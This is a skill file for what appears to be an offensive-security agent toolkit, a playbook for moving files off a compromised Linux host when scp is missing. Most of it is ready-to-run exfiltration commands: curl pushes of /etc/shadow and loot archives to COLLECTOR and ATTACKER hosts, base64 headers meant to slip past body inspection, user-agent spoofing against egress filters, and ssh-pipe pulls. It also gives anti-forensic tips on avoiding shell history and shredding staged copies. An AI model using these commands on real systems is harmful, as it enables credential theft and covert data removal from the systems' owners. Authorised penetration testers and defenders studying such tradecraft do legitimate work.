---
name: svc-exfil-file-transfer
description: Move data to/from a foothold when scp/sftp/rsync are NOT installed — covers BOTH egress profiles: box WITH internet (curl push/pull) and box with NO internet but SSH access (the ssh channel IS the transfer). Evidence ALWAYS ships compress+encrypted with the generated keyphrase stored in the evidence folder. Triggers - "no scp on the box", "how do I get this file off", "machine has no internet", loot exfil from a minimal/exotic Linux over ssh, need to drop a binary onto a target without a toolchain, transfer fails and you suspect --data-binary vs -d or a pty mangling the stream, packaging evidence for the report.
tags: [post_exploit, looting, exfil]
---

# File Transfer Without scp — curl Is Almost Always There

Reality check first: `curl` ships on virtually every Linux (even minimal/busybox
images), `wget` often, `scp`/`sftp` need a full SSH client **and** server pair —
frequently absent. Don't burn time installing scp; move the data with what's there.

Pick the profile: **box has egress** → curl sections below. **Box has NO internet
but you hold SSH** → skip straight to "No egress, SSH in" — the ssh channel itself
is the transfer (field case 2026-10-26: exotic offline Linux, scp broken, file out
via `ssh -T cat`).

```bash
# binary-safe single file push (COLLECTOR = your nc/python listener or webhook)
curl -sS -X POST --data-binary @/etc/shadow http://COLLECTOR:8000/

# whole loot dir in ONE request — stream the tarball, no temp file on disk
tar czf - /loot/dir | curl -sS -X POST --data-binary @- http://COLLECTOR:8000/loot.tgz

# small files through a header (survives body-inspection, lands in one line)
curl -sS -H "X-D: $(base64 /path/file | tr -d '\n')" http://COLLECTOR:8000/

# big file, chunked (Cloudflare & co cap body ~100MB per request)
split -b 8M loot.tar.gz part. && for p in part.*; do curl -sS -X POST --data-binary @"$p" http://COLLECTOR:8000/; done
```

## Drop (you → target), curl only

```bash
curl -fsSL -o /tmp/linpeas.sh http://ATTACKER:8000/linpeas.sh   # -f = fail on HTTP errors
curl -sS -C - -o /tmp/big.bin http://ATTACKER:8000/big.bin      # -C - = resume broken pulls
curl -sS --user-agent "Mozilla/5.0" -o /tmp/x URL               # pass naive egress UA filters
```

## Collector on your side (no fancy infra needed)

```bash
nc -lvp 8000 > loot.tar.gz                     # raw capture
python3 -m http.server 8000                    # for the drop direction
# blind targets (no callback): webhook.site / requestbin — NOTE: their URL lands in target egress logs
```

## Verify or it didn't happen

```bash
sha256sum loot.tar.gz        # on target
sha256sum loot.tar.gz        # on collector — MUST match; cut/paste and proxies lie
```

## Gotchas — what actually breaks

- **`-d` vs `--data-binary`**: `-d` strips newlines and mangles binary; `--data-binary @file`
  is the only safe push for files. This is the #1 reason "curl worked but the file is corrupt".
- **base64 on busybox** has no `-w0` → use `base64 | tr -d '\n'`.
- **Proxies**: curl silently honors `http_proxy`/`https_proxy` env — first call with `-v`
  so you know which egress path your data actually takes.
- **History**: the collector URL lands in target shell history. Prefix the command with a
  space (`HISTCONTROL=ignoreboth`) or clear history after looting.
- **Old curl**: verify `curl --version` — ancient builds mishandle `@-` stdin and `--data-binary`.
- **Pull vs push**: pull (you serve, target fetches) keeps your collector off target logs for
  the *data*, but still writes the URL into history. Push with a one-shot nc listener leaves
  nothing but an nginx-style line on your side. Choose per OPSEC need.
- After transfer: `rm` the staged copies on target and `shred` if the box may be imaged.

## Evidence rule — ALWAYS compress + encrypt; key lives in the evidence folder

Evidence NEVER leaves a box (or lands on ours) as plaintext. Compress + encrypt
in one step; generate the passphrase on OUR side and drop it next to the archive
in the engagement evidence folder — the folder is self-contained, any single
leaked file is useless without its sibling.

```bash
# 1) operator side: generate the keyphrase FIRST (never on the target)
KEY=$(openssl rand -base64 32)
ENG=~/.pwnharness/engagements/<name>; mkdir -p "$ENG"
umask 077 && printf '%s\n' "$KEY" > "$ENG/evidence-$(date +%Y%m%d).key"

# 2a) target has openssl (most boxes do) — encrypt AT SOURCE, exfil only ciphertext:
ssh -T user@target "tar czf - /loot/dir | openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:$KEY" \
  > "$ENG/evidence-$(date +%Y%m%d).tar.gz.enc"

# 2b) target has nothing (no openssl/gpg) — pipe the pull straight INTO local encryption,
#     plaintext never touches either disk:
ssh -T user@target 'tar czf - /loot/dir' | gpg --batch --symmetric --passphrase "$KEY" \
  -o "$ENG/evidence-$(date +%Y%m%d).tar.gz.gpg"

# 3) verify the round-trip BEFORE closing the engagement:
openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:$KEY -in "$ENG"/*.enc | tar tzf - >/dev/null && echo OK
```

Decrypt later: `openssl enc -d … | tar xzf -` (or `gpg -d`). The `.key` file is
chmod 600 and travels only with the evidence folder on trusted storage — never
through the same channel as the archive itself.

## No egress, SSH in — the ssh channel IS the transfer

scp needs `scp` on the target (legacy) or the sftp subsystem (modern OpenSSH) —
appliances/Dropbear ship neither. `ssh exec` works wherever ssh does.

```bash
# triage first: what does the exotic box actually have?
ssh user@target 'uname -a; id; which base64 gzip tar xxd od; df -h /tmp'

# primary path — binary-clean stream, -T disables pty (a pty CRLF-mangles binaries)
ssh -T user@target 'cat /path/file' > file
ssh -T user@target 'gzip -9c /path/file' | gunzip > file      # thin channel: compress at source
ssh -T user@target 'tar czf - /loot/dir' | tar xzf -          # whole dir, one stream

# pty forced (jump host / interactive policy) → base64 armor; base64 -d tolerates the \n
ssh -T user@target 'base64 /path/file' | base64 -d > file

# no base64 on the box at all → od-hex
ssh -T user@target 'od -An -v -tx1 /path/file | tr -d " \n"' | xxd -r -p > file

# huge file / channel keeps dropping → chunk with dd and resume by skip=
ssh -T user@target 'dd if=/path/file bs=1M skip=0 count=50 2>/dev/null | gzip' | gunzip >> part0

# exec forbidden (interactive-only) → base64 to screen, copy-paste, decode locally; gzip first, chunk per screen
```

Verify both sides (`sha256sum`) — non-interactive ssh does NOT write target shell
history, and leaves only the usual authlog line; still `rm`/`shred` staged copies if
the box may be imaged.
